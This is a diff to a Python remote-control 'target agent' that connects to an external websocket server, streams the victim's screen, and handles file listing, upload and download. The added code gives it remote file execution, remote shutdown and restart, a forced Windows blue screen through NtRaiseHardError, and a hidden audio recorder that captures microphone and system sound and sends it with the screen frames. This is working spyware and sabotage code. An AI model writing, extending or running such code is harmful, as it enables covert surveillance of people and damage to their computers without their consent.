@@ -8,8 +8,75 @@ from mss import mss
 from PIL import Image
 import websocket 
 import threading
-
+import sys
+import time
+import math
+import multiprocessing
+import ctypes
+import pyaudio
 RENDER_WS_URL = "wss://anotherwebsite-x1gv.onrender.com"
+audiodata = ""
+def bluescreen_pc():
+    import ctypes
+
+    # Access the kernel32 and ntdll libraries
+    kernel32 = ctypes.windll.kernel32
+    ntdll = ctypes.windll.ntdll
+
+    # Define privilege variables
+    SE_SHUTDOWN_PRIVILEGE = 19
+
+    # 1. Enable SE_SHUTDOWN_PRIVILEGE for the process
+    kernel32.RtlAdjustPrivilege(
+        SE_SHUTDOWN_PRIVILEGE, 
+        True, 
+        False, 
+        ctypes.byref(ctypes.c_bool())
+    )
+
+    # 2. Trigger the Blue Screen
+    # 0xC000021A represents a critical system process dying
+    ntdll.NtRaiseHardError(
+        0xC000021A, 
+        0, 
+        0, 
+        0, 
+        6, 
+        ctypes.byref(ctypes.c_ulong())
+    )
+def shutdown_pc():
+    """Shuts down the computer based on the operating system."""
+    if sys.platform == "win32":
+        # /s = shutdown, /t 1 = time delay of 1 second
+        os.system("shutdown /s /t 1")
+    elif sys.platform == "darwin" or sys.platform.startswith("linux"):
+        # Requires sudo privileges on Linux/macOS
+        os.system("sudo shutdown -h now")
+    else:
+        print("Unsupported operating system.")
+
+def restart_pc():
+    """Restarts the computer based on the operating system."""
+    if sys.platform == "win32":
+        # /r = restart, /t 1 = time delay of 1 second
+        os.system("shutdown /r /t 1")
+    elif sys.platform == "darwin" or sys.platform.startswith("linux"):
+        # Requires sudo privileges on Linux/macOS
+        os.system("sudo shutdown -r now")
+    else:
+        print("Unsupported operating system.")
+
+def launch_as_admin(exe_path):
+    # 'runas' forces Windows to launch the file with elevated Admin privileges
+    result = ctypes.windll.shell32.ShellExecuteW(
+        None, "runas", str(exe_path), None, None, 1
+    )
+
+    # ShellExecuteW returns a value greater than 32 if it succeeded
+    if result > 32:
+        print("Successfully launched process as Administrator.")
+    else:
+        print(f"Failed to launch. Windows Error Code: {result}")
 
 def get_directory_contents(base_path):
     try:
@@ -30,6 +97,7 @@ def get_directory_contents(base_path):
         return [f"❌ Error reading path: {e}"]
 
 def command_listener(ws):
+    global audiodata
     while True:
         try:
             result = ws.recv()
@@ -100,6 +168,14 @@ def command_listener(ws):
                             with open(dst, "wb") as dst:
                                 dst.write(decoded_bytes)
                         except Exception as e: print(e)
+                elif command == "run_item":
+                    target_item = payload.get("item_name", "")
+                    full_target_path = os.path.join(current_path, target_item)
+                    try:
+                        if os.path.exists(full_target_path):
+                            if os.path.isfile(full_target_path):
+                                os.startfile(full_target_path)
+                    except Exception as e: print(e)
                 elif command == "download_item":
                     target_item = payload.get("item_name", "")
                     file_path = os.path.join(current_path, target_item)
@@ -129,6 +205,12 @@ def command_listener(ws):
                             }))
                         
                     except Exception as e: print(e)
+                elif command == "shutdown":
+                    shutdown_pc()
+                elif command == "restart":
+                    restart_pc()
+                elif command == "bluescreen":
+                    bluescreen_pc()
 
                 ws.send(json.dumps({
                     "type": "file_list",
@@ -141,6 +223,7 @@ def command_listener(ws):
             break
 
 def run_target_agent():
+    global audiodata
     server_url = RENDER_WS_URL
     computer_name = os.environ.get("COMPUTERNAME", "Unknown-PC")
     
@@ -170,7 +253,8 @@ def run_target_agent():
 
                     ws.send(json.dumps({
                         "type": "stream_frame",
-                        "frame": b64_frame
+                        "frame": b64_frame,
+                        "audio":audiodata
                     }))
                     
                     time.sleep(0.05) 
@@ -178,6 +262,34 @@ def run_target_agent():
         except Exception as e:
             print(f"Target connection lost: {e}. Recovering in 5s...")
             time.sleep(5)
+# Audio Config
+FORMAT = pyaudio.paInt16
+CHANNELS = 2
+RATE = 16000
+CHUNK = 1920  # ~46ms chunks for low latency
+def ca():
+    global audiodata
+    p = pyaudio.PyAudio()
+    # Note: Ensure your default system input is set to Stereo Mix / VoiceMeeter 
+    # to capture both Mic + PC audio together.
+    stream = p.open(format=FORMAT,
+                    channels=CHANNELS,
+                    rate=RATE,
+                    input=True,
+                    frames_per_buffer=CHUNK)
+    try:
+        while True:
+            audio_string = base64.b64encode(stream.read(CHUNK, exception_on_overflow=False)).decode('utf-8')
+            audiodata = audio_string
+    except KeyboardInterrupt:
+        print("\nStopping recorder...")
+    finally:
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
 
 if __name__ == "__main__":
+    t = threading.Thread(target=ca, daemon=True)
+    t.start()
     run_target_agent()
+    
